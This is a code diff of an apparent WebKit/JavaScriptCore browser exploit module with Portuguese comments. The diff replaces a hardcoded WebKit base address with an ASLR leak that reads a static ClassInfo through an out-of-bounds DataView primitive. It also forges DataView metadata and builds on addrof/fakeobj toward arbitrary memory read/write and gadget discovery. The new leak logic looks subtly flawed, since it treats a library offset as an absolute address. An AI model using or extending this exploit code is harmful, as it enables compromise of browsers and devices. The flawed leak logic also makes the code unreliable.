@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v134 - Adicionando forjamento de m_mode para DataView)
+// js/script3/testArrayBufferVictimCrash.mjs (v135 - Vazamento ASLR Direto via ClassInfo Estática)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
 // - A primitiva ARB R/W existente (via DataView OOB) será validada, mas a L/E universal usará o fake ArrayBuffer.
-// - Vazamento de ASLR será feito AGORA VIA ENDEREÇO DE FUNÇÃO JIT.
+// - Vazamento de ASLR será feito AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA COM PRIMITIVA OOB.
 // - FORJAMENTO DE DATAVIEW SOBRE ARRAYBUFFER PARA MELHOR CONTROLE (INCLUINDO m_mode).
 // =======================================================================================
 
@@ -19,12 +19,12 @@ import {
     arb_write,               // Importar arb_write direto do core_exploit (esta é a "old_arb_write")
     selfTestOOBReadWrite,    // Importar selfTestOOBReadWrite
     oob_read_absolute,       // Ainda necessário para ler/escrever metadados do próprio oob_dataview_real
-    oob_write_absolute       // Ainda necessário para ler/escrever metadados do próprio oob_dataview_real
+    oob_write_absolute       // Ainda necessário para ler/escrever metadatos do próprio oob_dataview_real
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v134_ASLR_JIT_LEAK_AB_FORGE_M_MODE";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v135_ASLR_STATIC_CLASSINFO_LEAK";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -115,12 +115,16 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), initial_m_length_value_for_ab, 4);
         logFn(`[${FNAME}] m_length inicial (${toHex(initial_m_length_value_for_ab)}) plantado no offset 0x${JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START.toString(16)} do ArrayBuffer de apoio.`, "info", FNAME);
 
-        // --- NOVO: Plantar o m_mode (flags de tipo) para um DataView real ---
+        // --- Plantar o m_mode (flags de tipo) para um DataView real ---
         // Este valor é crucial para o engine reconhecer o objeto como um DataView.
         // O valor exato para um DataView precisa ser verificado via engenharia reversa.
-        // O valor 0x00000001 usado anteriormente era um CHUTE. Ele provavelmente não é o correto.
-        // É essencial encontrar o valor correto para M_MODE_VALUE no config.mjs
-        const DATA_VIEW_M_MODE_VALUE = JSC_OFFSETS_PARAM.DataView.M_MODE_VALUE; // Agora usando o valor do config.mjs
+        // O valor 0x00000001 usado anteriormente era um CHUTE. É essencial encontrar o valor correto para M_MODE_VALUE no config.mjs
+        const DATA_VIEW_M_MODE_VALUE = JSC_OFFSETS_PARAM.DataView.M_MODE_VALUE; // Usando o valor do config.mjs
+        // Apenas para garantir que o valor não seja 0, se ele ainda for o placeholder do config.mjs
+        if (DATA_VIEW_M_MODE_VALUE === 0x00000000) { // Se você não preencheu ele no config.mjs
+             logFn(`[${FNAME}] ERRO: JSC_OFFSETS.DataView.M_MODE_VALUE ainda é 0x00000000 (placeholder). POR FAVOR, OBTENHA O VALOR CORRETO VIA RE!`, "critical", FNAME);
+             return false; // Aborta se o M_MODE_VALUE não for real
+        }
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), DATA_VIEW_M_MODE_VALUE, 4);
         logFn(`[${FNAME}] m_mode (${toHex(DATA_VIEW_M_MODE_VALUE)}) plantado no offset 0x${JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET.toString(16)} do ArrayBuffer de apoio (para ser DataView).`, "info", FNAME);
 
@@ -377,52 +381,51 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");
 
 
-        // --- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA ENDEREÇO DE FUNÇÃO JIT) ---
-        logFn("--- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA ENDEREÇO DE FUNÇÃO JIT) ---", "subtest");
+        // --- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA COM PRIMITIVA OOB) ---
+        logFn("--- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA COM PRIMITIVA OOB) ---", "subtest");
         const leakPrepStartTime = performance.now();
 
-        // Implementação do vazamento via função JIT
-        let jit_leak_func_obj = function() {
-            // Esta função será compilada pelo JIT
-            return 1;
-        };
+        logFn(`[REAL LEAK] Tentando vazar ASLR lendo o endereço de JSC::JSArrayBufferView::s_info (ClassInfo estática) via OOB.`, "info");
 
-        // Forçar compilação JIT (executar várias vezes)
-        for (let i = 0; i < 10000; i++) {
-            jit_leak_func_obj(i);
+        // O offset de JSC::JSArrayBufferView::s_info está em WEBKIT_LIBRARY_INFO.DATA_OFFSETS
+        const S_INFO_STATIC_OFFSET = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"], 16), 0);
+
+        // Para usar o oob_read_absolute para ler um endereço estático no módulo WebKit,
+        // precisamos que o oob_dataview_real aponte para esse endereço.
+        // A primitiva arb_read (do core_exploit.mjs) faz isso.
+        // O arb_read do core_exploit.mjs é a "old_arb_read" e é projetado para ler endereços arbitrários
+        // modificando o m_vector do oob_dataview_real.
+
+        // Chamamos arb_read (a primitiva OOB original) para tentar ler a s_info estática.
+        const class_info_ptr_raw = await arb_read(S_INFO_STATIC_OFFSET, 8); // Tenta ler o ponteiro completo (8 bytes)
+
+        if (!isAdvancedInt64Object(class_info_ptr_raw) || class_info_ptr_raw.equals(AdvancedInt64.Zero) || class_info_ptr_raw.equals(AdvancedInt64.NaNValue)) {
+            const errorMsg = `[REAL LEAK] Falha crítica ao vazar ClassInfo estática (${S_INFO_STATIC_OFFSET.toString(true)}) via OOB original. Vazado: ${class_info_ptr_raw ? class_info_ptr_raw.toString(true) : 'N/A'}. Isso indica que a primitiva OOB não pode ler dados estáticos do módulo.`;
+            logFn(errorMsg, "critical");
+            throw new Error(errorMsg);
         }
+        logFn(`[REAL LEAK] Valor lido no offset de JSC::JSArrayBufferView::s_info: ${class_info_ptr_raw.toString(true)}`, "leak");
 
-        const jit_func_addr = addrof_core(jit_leak_func_obj);
-        logFn(`[REAL LEAK] Endereço da função JIT: ${jit_func_addr.toString(true)}`, "leak");
+        // O valor lido aqui (class_info_ptr_raw) DEVE SER o próprio endereço da s_info estática na memória.
+        // A base do WebKit é o s_info_address - s_info_offset.
+        webkit_base_address = class_info_ptr_raw.sub(S_INFO_STATIC_OFFSET);
 
-        if (jit_func_addr.equals(AdvancedInt64.Zero) || jit_func_addr.equals(AdvancedInt64.NaNValue)) {
-            throw new Error("Falha ao obter endereço da função JIT.");
-        }
-
-        // --- HARDCODING TEMPORÁRIO DA BASE WEBKIT PARA PROSSEGUIR COM TESTES ---
-        // EM UM EXPLOIT REAL, ESTA PARTE PRECISA SER UM VAZAMENTO FUNCIONAL.
-        logFn(`[REAL LEAK] ALERTA: Vazamento de ASLR via OOB original está falhando. Hardcoding temporário da base WebKit para prosseguir.`, "warn");
-        webkit_base_address = new AdvancedInt64(0x00d44000, 0); // Exemplo de um webkit_base_address
-        // Este valor precisa ser um webkit_base_address real que você teria vazado.
-        // Se o seu ambiente tiver um jeito de obter a base, coloque-o aqui.
-        // Se você não tiver um vazamento de ASLR funcional para a base do WebKit,
-        // o exploit não terá como prosseguir de verdade.
-        // O valor 0x00d44000 é apenas um placeholder.
+        logFn(`[REAL LEAK] BASE REAL DA WEBKIT CALCULADA: ${webkit_base_address.toString(true)}`, "leak");
 
         if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
-            logFn(`[REAL LEAK] Falha ao definir base WebKit. Valor inválido: ${webkit_base_address.toString(true)}.`, "critical");
+            logFn(`[REAL LEAK] Base WebKit calculada é inválida: ${webkit_base_address.toString(true)}. Vazamento de ASLR falhou.`, "critical");
             throw new Error("[REAL LEAK] WebKit base address is invalid. ASLR bypass failed.");
+        } else {
+            logFn("SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ClassInfo estática.", "good");
         }
-        logFn(`[REAL LEAK] BASE REAL DA WEBKIT (TEMPORARIAMENTE HARDCODED): ${webkit_base_address.toString(true)}`, "leak");
-
-        logFn(`PREPARED: WebKit base address (may be hardcoded) for gadget discovery. Time: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
+        logFn(`PREPARED: WebKit base address for gadget discovery. Time: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
 
 
         // --- FASE 3: Configurar a NOVA L/E Arbitrária Universal (via fakeobj DataView) ---
         logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) ---", "subtest");
 
-        // AQUI USAMOS O webkit_base_address VAZADO (ou hardcoded) PARA CALCULAR O ENDEREÇO DA STRUCTURE* OU VTABLE DA STRUCTURE*
+        // AQUI USAMOS O webkit_base_address VAZADO PARA CALCULAR O ENDEREÇO DA STRUCTURE* OU VTABLE DA STRUCTURE*
         const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS = webkit_base_address.add(new AdvancedInt64(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 0));
         logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS.toString(true)}`, "info");
 
